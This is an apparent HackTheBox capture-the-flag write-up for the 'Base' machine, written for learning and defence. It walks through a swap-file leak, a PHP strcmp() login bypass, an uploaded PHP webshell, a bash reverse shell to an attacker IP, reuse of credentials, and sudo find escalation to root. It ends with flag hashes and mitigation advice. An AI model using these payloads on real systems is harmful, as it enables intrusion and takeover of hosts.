# Base - HackTheBox Writeup

**Date:** April 16, 2026
**OS:** Linux
**IP Address:** 10.129.28.116 (Tested) / 10.10.10.48 (Writeup)
**Difficulty:** Easy
**Points:** 10

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Base**. 

*   **Initial Access:** Achieved by discovering a Vim swap file (`login.php.swp`) in a listable `/login` directory. This led to the identification of a PHP `strcmp()` type juggling vulnerability. By manipulating the login request in Burp Suite to send internal variables as arrays, the authentication was bypassed, granting access to an upload form.
*   **Foothold:** A PHP webshell was uploaded and triggered from the `/_uploaded` directory, providing a reverse shell as the `www-data` user.
*   **Lateral Movement:** Discovered credentials in `config.php` were found to be reused by the system user `john`, allowing for SSH access.
*   **Privilege Escalation:** Escalated to root by exploiting a sudo misconfiguration on the `find` binary, using a classic GTFOBin technique to spawn an elevated shell.
*   **Key Learning Points:** 
    * The importance of cleaning up temporary files (like Vim swap files) in web directories.
    * Understanding PHP's loose comparison behaviors and how `strcmp()` can be bypassed with array inputs.
    * The risks associated with password reuse and insecure sudo permissions.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 22/tcp | SSH | OpenSSH 7.6p1 | Standard SSH service |
| 80/tcp | HTTP | Apache httpd 2.4.29 | Web application "Welcome to Base" |

**Nmap Command:**
```bash
sudo nmap -sC -sV 10.129.28.116
```

## 2.2. Web Enumeration
Enumerating the web server reveals a `/login/` directory. Accessing the directory directly shows that directory listing is enabled.

### Discovery of Swap Files
In the `/login/` directory, a file named `login.php.swp` is found. Swap files are temporary files created by the Vim editor. Because the extension is not `.php`, the web server serves the raw content as text.

### Extracting Code from Swap File
To recover the human-readable text from the temporary file, we use the `strings` and `tac` utilities (searching for logic that might be stored out of order):
```bash
strings login.php.swp >> file.txt
tac file.txt
```

---

# 3. Initial Access (User Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** PHP `strcmp()` Type Juggling
*   **Vector:** The application uses `strcmp($password, $_POST['password']) == 0` for authentication.
*   **Issue:** In PHP, if `strcmp()` is passed an array instead of a string, it returns `NULL`. Using the loose comparison operator (`== 0`), the value `NULL` is treated as `0`, resulting in a successful authentication bypass.

## 3.2. Exploitation Path
1.  **Vulnerability Identification:** Intercepted the login request in Burp Suite.
2.  **Logic Bypass:** Modified the POST data to convert the `username` and `password` variables into arrays by appending `[]`:
    ```http
    POST /login/login.php HTTP/1.1
    ...
    username[]=admin&password[]=anything
    ```
3.  **Upload Access:** The bypass granted access to `upload.php`.
4.  **Foothold:** 
    *   Created a simple test file to confirm execution: `echo "<?php phpinfo(); ?>" > test.php`.
    *   Uploaded a PHP webshell: `<?php echo system($_REQUEST['cmd']);?>`.
    *   Located the uploaded file in the `/_uploaded/` directory (discovered via Gobuster).
5.  **Reverse Shell:** Captured a reverse shell by converting the request to a POST in Burp Suite and sending the following Bash payload (URL encoded):
    ```bash
    /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.240/4444 0>&1'
    ```

**User Flag:**
```bash
# Found after lateral movement to john
cat /home/john/user.txt
# f54846c258f3b4612f78a819573d158e
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Lateral Movement
*   Enumerated `/var/www/html/login/config.php` to find credentials:
    ```php
    $username = "admin";
    $password = "thisisagoodpassword";
    ```
*   Identified system user `john` in `/home`.
*   Successfully logged in via SSH as `john` using the password `thisisagoodpassword` (reused).

## 4.2. Exploitation Path
1.  **Local Enumeration:** Checked sudo privileges:
    ```bash
    sudo -l
    # (root : root) /usr/bin/find
    ```
2.  **Method:** Leveraged the `find` binary's `-exec` capability (GTFOBin).
3.  **Escalation:**
    ```bash
    sudo find . -exec /bin/sh \; -quit
    ```

**Root Flag:**
```bash
cat /root/root.txt
# 51709519ea18ab37dd6fc58096bea949
```

---

# 5. Credentials & Loot

| Username | Password / Hash | Source |
| :--- | :--- | :--- |
| admin | thisisagoodpassword | /login/config.php |
| john | thisisagoodpassword | Password Reuse (SSH) |

---

# 6. Recommendations & Mitigation
1.  **Code Security:** Use strict comparison operators (`===`) in PHP to prevent type juggling vulnerabilities. Always validate input data types.
2.  **Directory Hardening:** Disable directory listing and ensure that temporary files (like `.swp`, `.bak`, `.old`) are deleted from production web roots.
3.  **Password Policy:** Implement unique passwords for service accounts and system users to prevent lateral movement via password reuse.
4.  **Sudo Security:** Avoid granting sudo permissions to binaries with shell-escape capabilities unless strictly necessary and monitored.
